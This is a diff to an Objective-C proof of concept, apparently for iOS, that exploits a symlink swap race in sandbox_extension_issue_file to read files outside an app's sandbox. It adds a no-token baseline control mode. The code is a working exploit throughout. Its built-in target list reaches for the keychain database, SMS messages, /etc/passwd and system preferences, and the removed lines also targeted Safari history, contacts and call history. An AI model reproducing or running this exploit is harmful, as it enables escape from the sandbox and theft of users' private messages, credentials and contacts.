@@ -1,15 +1,15 @@
-// Sbx.m - sandbox_extension TOCTOU reader
+// Sbx.m - sandbox_extension TOCTOU reader + baseline control
 //
-// Two issue modes, because the extension carries the type of the path it was
-// minted for:
-//   file mode : symlink -> a regular file we own  -> grants "read this file"
-//   dir  mode : symlink -> a directory we own     -> grants "read this dir"
-// A token minted in file mode still lets us read out-of-sandbox files (the swap
-// wins), but opendir() on a directory is refused (EPERM) because the extension
-// does not carry directory enumeration. dir mode is the fix for that.
+// Three modes per target, so the extension's contribution is measurable:
+//   #0  baseline : no token at all, straight stat/read          <- the control
+//   #f  file mode: symlink -> a regular file we own, issue, swap to target, consume
+//   #d  dir  mode: symlink -> a directory we own,    issue, swap to target, consume
+//
+// If a target reads in #0, the extension added nothing there and the hit is just
+// baseline readability. Only targets that fail in #0 and succeed in #f/#d show
+// the bug doing real work.
 //
 // Queue: Documents/sbx.txt, one line: tag<TAB>absolute-path
-// Every item is attempted in both modes, tagged <tag>#f and <tag>#d.
 
 #import "Sbx.h"
 
@@ -29,16 +29,6 @@ static NSString *gSbxOut;
 static NSMutableArray *gSbxProduced;
 static NSMutableArray *gSbxSummary;
 
-// One line per attempt, fixed width so it reads well on a phone screen.
-static void sbxNote(NSString *fmt, ...) {
-    va_list ap;
-    va_start(ap, fmt);
-    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
-    va_end(ap);
-    [gSbxSummary addObject:s];
-    NSLog(@"[sbx] %@", s);
-}
-
 static void sbxLog(NSString *fmt, ...) {
     va_list ap;
     va_start(ap, fmt);
@@ -57,29 +47,36 @@ static void sbxLog(NSString *fmt, ...) {
     [fh closeFile];
 }
 
+static void sbxNote(NSString *fmt, ...) {
+    va_list ap;
+    va_start(ap, fmt);
+    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
+    va_end(ap);
+    [gSbxSummary addObject:s];
+    NSLog(@"[sbx] %@", s);
+}
+
 static void sbxPut(NSString *name, NSData *data) {
     NSString *p = [gSbxOut stringByAppendingPathComponent:name];
     if ([data writeToFile:p atomically:YES]) [gSbxProduced addObject:name];
 }
 
-#pragma mark - listing
+#pragma mark - primitives
 
-static void tryList(NSString *tag, const char *linkPath) {
-    DIR *dp = opendir(linkPath);
+static void tryList(NSString *tag, const char *path) {
+    DIR *dp = opendir(path);
     if (dp == NULL) {
         int e1 = errno;
-        int fd = open(linkPath, O_RDONLY | O_DIRECTORY);
+        int fd = open(path, O_RDONLY | O_DIRECTORY);
         if (fd >= 0) {
             dp = fdopendir(fd);
             if (dp == NULL) close(fd);
         }
         if (dp == NULL) {
-            sbxNote(@"FAIL %-16s opendir e%d open/dir e%d", [tag UTF8String], e1, errno);
+            sbxNote(@"FAIL %-18s opendir e%d open/dir e%d", [tag UTF8String], e1, errno);
             return;
         }
-        sbxLog(@"DIR[%@] opendir failed (%d), open(O_DIRECTORY)+fdopendir ok", tag, e1);
     }
-
     NSMutableArray *names = [NSMutableArray array];
     struct dirent *de;
     while ((de = readdir(dp)) != NULL && names.count < 4000) {
@@ -89,17 +86,16 @@ static void tryList(NSString *tag, const char *linkPath) {
         }
     }
     closedir(dp);
-
     NSArray *sorted = [names sortedArrayUsingSelector:@selector(compare:)];
     NSString *body = [[sorted componentsJoinedByString:@"\n"] stringByAppendingString:@"\n"];
     sbxPut([tag stringByAppendingString:@".dir"], [body dataUsingEncoding:NSUTF8StringEncoding]);
-    sbxNote(@"OK   %-16s dir %lu entries", [tag UTF8String], (unsigned long)names.count);
+    sbxNote(@"OK   %-18s dir %lu entries", [tag UTF8String], (unsigned long)names.count);
 }
 
-static void tryRead(NSString *tag, const char *linkPath, int64_t size) {
-    int fd = open(linkPath, O_RDONLY);
+static void tryRead(NSString *tag, const char *path, int64_t size) {
+    int fd = open(path, O_RDONLY);
     if (fd < 0) {
-        sbxNote(@"FAIL %-16s open e%d", [tag UTF8String], errno);
+        sbxNote(@"FAIL %-18s open e%d", [tag UTF8String], errno);
         return;
     }
     NSMutableData *all = [NSMutableData data];
@@ -111,18 +107,45 @@ static void tryRead(NSString *tag, const char *linkPath, int64_t size) {
     }
     close(fd);
     sbxPut([tag stringByAppendingString:@".bin"], all);
-    sbxNote(@"OK   %-16s %lu B", [tag UTF8String], (unsigned long)all.length);
+    sbxNote(@"OK   %-18s %lu B", [tag UTF8String], (unsigned long)all.length);
+}
+
+static void inspect(NSString *tag, const char *path, NSString *target) {
+    struct stat st;
+    if (stat(path, &st) != 0) {
+        sbxNote(@"FAIL %-18s stat e%d", [tag UTF8String], errno);
+        return;
+    }
+    NSString *meta = [NSString stringWithFormat:
+        @"path=%@\nmode=%o\nsize=%lld\nuid=%u\ngid=%u\nisDir=%d\n",
+        target, st.st_mode, (long long)st.st_size, st.st_uid, st.st_gid,
+        ((st.st_mode & 0170000) == 0040000) ? 1 : 0];
+    sbxPut([tag stringByAppendingString:@".meta"], [meta dataUsingEncoding:NSUTF8StringEncoding]);
+
+    if ((st.st_mode & 0170000) == 0040000) {
+        tryList(tag, path);
+    } else {
+        tryRead(tag, path, (int64_t)st.st_size);
+    }
 }
 
 #pragma mark - one attempt
 
-static void sbxOne(NSString *tag, NSString *target, BOOL dirMode) {
-    NSString *tmp = NSTemporaryDirectory();
-    NSString *s = [tmp stringByAppendingPathComponent:@"s"];      // file target
-    NSString *d = [tmp stringByAppendingPathComponent:@"d"];      // dir target
-    NSString *l = [tmp stringByAppendingPathComponent:@"l"];      // the symlink
+static void sbxOne(NSString *tag, NSString *target, int mode) {
+    const char *p = [target UTF8String];
 
-    if (dirMode) {
+    // mode 0: control, no extension involved at all
+    if (mode == 0) {
+        inspect(tag, p, target);
+        return;
+    }
+
+    NSString *tmp = NSTemporaryDirectory();
+    NSString *s = [tmp stringByAppendingPathComponent:@"s"];
+    NSString *d = [tmp stringByAppendingPathComponent:@"d"];
+    NSString *l = [tmp stringByAppendingPathComponent:@"l"];
+
+    if (mode == 2) {
         [[NSFileManager defaultManager] createDirectoryAtPath:d
                                  withIntermediateDirectories:YES attributes:nil error:nil];
     } else {
@@ -130,60 +153,39 @@ static void sbxOne(NSString *tag, NSString *target, BOOL dirMode) {
     }
 
     unlink([l UTF8String]);
-    if (symlink([(dirMode ? d : s) UTF8String], [l UTF8String]) != 0) {
-        sbxLog(@"SETUP[%@] symlink failed errno=%d", tag, errno);
+    if (symlink([(mode == 2 ? d : s) UTF8String], [l UTF8String]) != 0) {
+        sbxNote(@"FAIL %-18s symlink e%d", [tag UTF8String], errno);
         return;
     }
 
-    char *token = sandbox_extension_issue_file("com.apple.app-sandbox.read",
-                                              [l UTF8String], 0);
+    char *token = sandbox_extension_issue_file("com.apple.app-sandbox.read", [l UTF8String], 0);
     if (token == NULL) {
-        sbxLog(@"ISSUE[%@] NULL (dirMode=%d)", tag, (int)dirMode);
-        sbxNote(@"FAIL %-16s issue=NULL", [tag UTF8String]);
+        sbxNote(@"FAIL %-18s issue=NULL", [tag UTF8String]);
         unlink([l UTF8String]);
         return;
     }
-    sbxLog(@"ISSUE[%@] ok (dirMode=%d)", tag, (int)dirMode);
 
     unlink([l UTF8String]);
-    if (symlink([target UTF8String], [l UTF8String]) != 0) {
-        sbxLog(@"SWAP[%@] failed errno=%d", tag, errno);
+    if (symlink(p, [l UTF8String]) != 0) {
+        sbxNote(@"FAIL %-18s swap e%d", [tag UTF8String], errno);
         free(token);
         return;
     }
 
     int64_t h = sandbox_extension_consume(token);
-    sbxLog(@"CONSUME[%@] handle=%lld", tag, h);
+    if (h <= 0) sbxNote(@"NOTE %-18s consume=%lld", [tag UTF8String], h);
 
-    struct stat st;
-    if (stat([l UTF8String], &st) != 0) {
-        sbxLog(@"STAT[%@] failed errno=%d (%s)", tag, errno, strerror(errno));
-        sbxNote(@"FAIL %-16s stat e%d", [tag UTF8String], errno);
-    } else {
-        // Metadata is readable for any path, even where opendir() is refused,
-        // so always record it: this doubles as an exists/type/size oracle.
-        NSString *meta = [NSString stringWithFormat:
-            @"path=%@\nmode=%o\nsize=%lld\nuid=%u\ngid=%u\nisDir=%d\n",
-            target, st.st_mode, (long long)st.st_size, st.st_uid, st.st_gid,
-            ((st.st_mode & 0170000) == 0040000) ? 1 : 0];
-        sbxPut([tag stringByAppendingString:@".meta"],
-               [meta dataUsingEncoding:NSUTF8StringEncoding]);
-
-        if ((st.st_mode & 0170000) == 0040000) {
-            tryList(tag, [l UTF8String]);
-        } else {
-            tryRead(tag, [l UTF8String], (int64_t)st.st_size);
-        }
-    }
+    inspect(tag, [l UTF8String], target);
 
     if (h > 0) sandbox_extension_release(h);
     free(token);
     unlink([l UTF8String]);
 }
 
-static void sbxBoth(NSString *tag, NSString *target) {
-    sbxOne([tag stringByAppendingString:@"#f"], target, NO);
-    sbxOne([tag stringByAppendingString:@"#d"], target, YES);
+static void sbxAll(NSString *tag, NSString *target) {
+    sbxOne([tag stringByAppendingString:@"#0"], target, 0);
+    sbxOne([tag stringByAppendingString:@"#f"], target, 1);
+    sbxOne([tag stringByAppendingString:@"#d"], target, 2);
 }
 
 #pragma mark - entry
@@ -201,32 +203,24 @@ int sbxRun(void) {
     NSString *q = [NSString stringWithContentsOfFile:[gSbxDocs stringByAppendingPathComponent:@"sbx.txt"]
                                             encoding:NSUTF8StringEncoding error:nil];
     if (q.length == 0) {
-        sbxLog(@"sbx.txt empty: built-in probe set");
-        // Directories: confirms the enumeration boundary (expected EPERM).
-        sbxBoth(@"privetc",      @"/private/etc");
-        sbxBoth(@"mobilelib",    @"/var/mobile/Library");
-        sbxBoth(@"media",        @"/var/mobile/Media");
-        sbxBoth(@"sysgroup",     @"/var/containers/Shared/SystemGroup");
-        sbxBoth(@"appdata",      @"/var/mobile/Containers/Data/Application");
-        // Files: the read primitive is unrestricted, so hit the interesting ones.
-        sbxBoth(@"passwd",       @"/etc/passwd");
-        sbxBoth(@"masterpasswd", @"/private/etc/master.passwd");
-        sbxBoth(@"sms",          @"/var/mobile/Library/SMS/sms.db");
-        sbxBoth(@"safarihist",   @"/var/mobile/Library/Safari/History.db");
-        sbxBoth(@"addressbook",  @"/var/mobile/Library/AddressBook/AddressBook.sqlitedb");
-        sbxBoth(@"callhistory",  @"/var/mobile/Library/CallHistoryDB/CallHistory.storedata");
-        sbxBoth(@"keychain",     @"/var/Keychains/keychain-2.db");
-        sbxBoth(@"frontboard",   @"/var/mobile/Library/FrontBoard/applicationState.plist");
-        sbxBoth(@"iconstate",    @"/var/mobile/Library/SpringBoard/IconState.plist");
-        sbxBoth(@"globalprefs",  @"/var/mobile/Library/Preferences/.GlobalPreferences.plist");
-        sbxBoth(@"networkd",     @"/var/preferences/com.apple.networkd.plist");
+        sbxLog(@"sbx.txt empty: built-in probe set (baseline + file + dir)");
+        sbxAll(@"privetc",     @"/private/etc");
+        sbxAll(@"mobilelib",   @"/var/mobile/Library");
+        sbxAll(@"media",       @"/var/mobile/Media");
+        sbxAll(@"passwd",      @"/etc/passwd");
+        sbxAll(@"hosts",       @"/etc/hosts");
+        sbxAll(@"globalprefs", @"/var/mobile/Library/Preferences/.GlobalPreferences.plist");
+        sbxAll(@"networkd",    @"/var/preferences/com.apple.networkd.plist");
+        sbxAll(@"iconstate",   @"/var/mobile/Library/SpringBoard/IconState.plist");
+        sbxAll(@"keychain",    @"/var/Keychains/keychain-2.db");
+        sbxAll(@"sms",         @"/var/mobile/Library/SMS/sms.db");
     } else {
         NSArray *lines = [q componentsSeparatedByString:@"\n"];
         for (NSString *line in lines) {
             if (line.length == 0) continue;
-            NSArray *p = [line componentsSeparatedByString:@"\t"];
-            if (p.count < 2) continue;
-            sbxBoth(p[0], p[1]);
+            NSArray *parts = [line componentsSeparatedByString:@"\t"];
+            if (parts.count < 2) continue;
+            sbxAll(parts[0], parts[1]);
         }
     }
 
@@ -235,22 +229,27 @@ int sbxRun(void) {
     [[idx dataUsingEncoding:NSUTF8StringEncoding]
         writeToFile:[gSbxOut stringByAppendingPathComponent:@"sbx_index.txt"] atomically:YES];
 
-    NSMutableArray *sum = [NSMutableArray array];
-    NSMutableArray *okLines = [NSMutableArray array];
-    NSMutableArray *failLines = [NSMutableArray array];
+    NSUInteger n0 = 0, nf = 0, nd = 0;
     for (NSString *line in gSbxSummary) {
-        if ([line hasPrefix:@"OK"]) [okLines addObject:line];
-        else [failLines addObject:line];
+        if (![line hasPrefix:@"OK"]) continue;
+        if ([line rangeOfString:@"#0 "].location != NSNotFound) n0++;
+        else if ([line rangeOfString:@"#f "].location != NSNotFound) nf++;
+        else if ([line rangeOfString:@"#d "].location != NSNotFound) nd++;
     }
-    [sum addObject:[NSString stringWithFormat:@"%lu hit / %lu attempts (%lu artifacts)",
-                    (unsigned long)okLines.count, (unsigned long)gSbxSummary.count,
-                    (unsigned long)gSbxProduced.count]];
-    [sum addObjectsFromArray:okLines];
-    [sum addObjectsFromArray:failLines];
+
+    NSMutableArray *sum = [NSMutableArray array];
+    [sum addObject:[NSString stringWithFormat:
+                    @"hits: #0=%lu  #f=%lu  #d=%lu   (%lu attempts)",
+                    (unsigned long)n0, (unsigned long)nf, (unsigned long)nd,
+                    (unsigned long)gSbxSummary.count]];
+    [sum addObject:@"--- #f/#d hits without a #0 hit = the bug ---"];
+    for (NSString *line in gSbxSummary) if ([line hasPrefix:@"OK"]) [sum addObject:line];
+    for (NSString *line in gSbxSummary) if (![line hasPrefix:@"OK"]) [sum addObject:line];
+
     NSString *sumText = [[sum componentsJoinedByString:@"\n"] stringByAppendingString:@"\n"];
     [[sumText dataUsingEncoding:NSUTF8StringEncoding]
         writeToFile:[gSbxDocs stringByAppendingPathComponent:@"sbx_summary.txt"] atomically:YES];
 
-    sbxLog(@"=== sbx end, %lu artifacts ===", (unsigned long)gSbxProduced.count);
+    sbxLog(@"=== sbx end: #0=%lu #f=%lu #d=%lu ===", (unsigned long)n0, (unsigned long)nf, (unsigned long)nd);
     return 0;
 }
